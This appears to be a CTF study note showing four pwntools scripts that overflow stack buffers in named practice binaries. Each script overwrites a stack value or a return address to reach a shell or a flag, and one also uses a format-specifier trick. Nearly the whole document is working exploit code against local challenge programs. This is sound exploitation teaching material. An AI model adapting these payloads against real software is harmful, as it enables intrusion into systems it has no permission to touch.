# Overwrite a Stack Value

Examples of simple buffer owverflows to edit a stack value and get a shell or flag.  

---

A check is made to see if a stack value has changed after our input is received.  

```python3
#!/usr/bin/env python3
from pwn import *

context.log_level="debug"
io = process("./boi")

offset = b"A" * 20              # Offset to the target value
value = b"\xee\xba\xf3\xca"     # New value to be set
payload = offset + value        # create the payload
io.recv()                       # Run the program and receive lines
io.send(payload)                # Send the payload
io.interactive()                # Interact with the shell
```

---

Same principal as above  

```python3
from pwn import *

context.log_level="debug"
io = process("./pwn1")

# What is your name?
io.sendline(b"Sir Lancelot of Camelot")

# What is your quest?

io.sendline(b"To seek the Holy Grail.")

# What is your secret
payload = b"A" * 43 + b"\xc8\x10\xa1\xde"
io.sendline(payload)

# Win
io.recv()
```

---

The flag is read from a file and stored on the stack. We can overwrite the address that is called to print to the screen.  

```python3
from pwn import *

# RET2 Flag location
# Flag at 0x804a080

context.log_level="debug"
io = process("./just_do_it")

# payload = b"P@SSW0RD\x00"
junk = b"\x00" * 20
addr = p32(0x804a080)
payload = junk + addr
io.sendline(payload)

# Win
io.interactive()
```

---

Overwrite a format specifier in the first input.  
The second input overwrites a return address which you can point to a function that prints the flag.  

```python
#!/usr/bin/env python3
from pwn import *

context.log_level="debug"

io = process("./vuln-chat")

payload1 = b"A" * 20
payload1 += b"%99s"
io.recvuntil("username: ")
io.sendline(payload1)

payload2 = b"A" * 49
payload2 += p32(0x0804856b)
io.recvuntil("But how do I know I can trust you?\n")
io.sendline(payload2)
io.interactive()
```
